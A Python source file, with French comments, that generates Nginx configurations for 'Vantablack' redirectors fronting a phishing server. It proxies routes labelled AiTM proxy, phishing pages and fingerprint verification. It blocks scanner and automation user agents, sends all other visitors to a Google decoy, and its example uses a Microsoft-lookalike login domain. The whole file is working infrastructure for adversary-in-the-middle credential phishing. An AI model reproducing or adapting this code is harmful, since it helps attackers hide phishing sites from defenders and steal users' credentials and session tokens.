import os
from typing import Optional, List, Dict

class NginxConfigGenerator:
    """
    Générateur de configuration Nginx pour les Redirecteurs (Tier 2).
    Permet de déployer rapidement des reverse-proxies sécurisés devant le Core.
    """
    
    def __init__(self, 
                 domain_name: str, 
                 upstream_url: str = "http://127.0.0.1:8000",
                 decoy_url: str = "https://www.google.com",
                 ssl_cert: Optional[str] = None,
                 ssl_key: Optional[str] = None):
        self.domain_name = domain_name
        self.upstream_url = upstream_url
        self.decoy_url = decoy_url
        self.ssl_cert = ssl_cert
        self.ssl_key = ssl_key
        
    def generate_config(self) -> str:
        """Génère le contenu du fichier de configuration nginx.conf"""
        
        config = []
        
        # Header
        config.append(f"# Vantablack Tier 2 Redirector - {self.domain_name}")
        config.append(f"# Generated automatically")
        config.append("")
        
        # Upstream definition
        config.append("upstream vantablack_core {")
        # Remove http:// or https:// if present for upstream definition (nginx needs host:port)
        upstream_host = self.upstream_url.replace("http://", "").replace("https://", "")
        config.append(f"    server {upstream_host};")
        config.append("}")
        config.append("")
        
        # Server block
        config.append("server {")
        
        # Listen ports
        if self.ssl_cert and self.ssl_key:
            config.append("    listen 443 ssl http2;")
            config.append("    listen [::]:443 ssl http2;")
            config.append(f"    ssl_certificate {self.ssl_cert};")
            config.append(f"    ssl_certificate_key {self.ssl_key};")
            config.append("    ssl_protocols TLSv1.2 TLSv1.3;")
            config.append("    ssl_ciphers HIGH:!aNULL:!MD5;")
        else:
            config.append("    listen 80;")
            config.append("    listen [::]:80;")
            
        config.append(f"    server_name {self.domain_name};")
        config.append("")
        
        # Security Headers
        config.append("    # Security Headers")
        config.append('    add_header X-Content-Type-Options "nosniff";')
        config.append('    add_header X-Frame-Options "DENY";')
        config.append('    add_header X-XSS-Protection "1; mode=block";')
        config.append("    server_tokens off;")
        config.append("")
        
        # Anti-Bot (Basic Nginx Level)
        config.append("    # Basic Bot Filtering")
        config.append('    if ($http_user_agent ~* (curl|wget|python|libwww|docker|vagrant|ansible|puppet|chef)) {')
        config.append("        return 403;")
        config.append("    }")
        config.append("")
        
        # Core Locations
        locations = [
            "/v5/r/",       # Redirector
            "/v5/p/",       # AiTM Proxy
            "/v5/phish/",   # Phishing Pages
            "/v5/auth/",    # API Auth
            "/v5/verify",   # Fingerprint Verification
            "/static/",     # Static Assets
            "/assets/"      # QR Codes / Logos
        ]
        
        for loc in locations:
            config.append(f"    location {loc} {{")
            config.append("        proxy_pass http://vantablack_core;")
            config.append("        proxy_set_header Host $host;")
            config.append("        proxy_set_header X-Real-IP $remote_addr;")
            config.append("        proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;")
            config.append("        proxy_set_header X-Forwarded-Proto $scheme;")
            
            # WebSocket support for AiTM
            if loc == "/v5/p/":
                config.append("        # WebSocket Support")
                config.append("        proxy_http_version 1.1;")
                config.append('        proxy_set_header Upgrade $http_upgrade;')
                config.append('        proxy_set_header Connection "upgrade";')
            
            config.append("    }")
            config.append("")
            
        # Catch-all Redirect
        config.append("    # Catch-all Decoy")
        config.append("    location / {")
        config.append(f"        return 302 {self.decoy_url};")
        config.append("    }")
        
        config.append("}")
        
        # HTTP -> HTTPS Redirect if SSL enabled
        if self.ssl_cert and self.ssl_key:
            config.append("")
            config.append("server {")
            config.append("    listen 80;")
            config.append("    listen [::]:80;")
            config.append(f"    server_name {self.domain_name};")
            config.append("    return 301 https://$host$request_uri;")
            config.append("}")
            
        return "\n".join(config)

    def save_to_file(self, output_path: str):
        """Sauvegarde la configuration dans un fichier"""
        config_content = self.generate_config()
        with open(output_path, "w") as f:
            f.write(config_content)
        print(f"[+] Nginx configuration saved to {output_path}")

if __name__ == "__main__":
    # Example usage
    generator = NginxConfigGenerator(
        domain_name="login.microsoft-security-verify.com",
        upstream_url="http://10.0.0.5:8000", # Private IP
        ssl_cert="/etc/letsencrypt/live/domain/fullchain.pem",
        ssl_key="/etc/letsencrypt/live/domain/privkey.pem"
    )
    print(generator.generate_config())
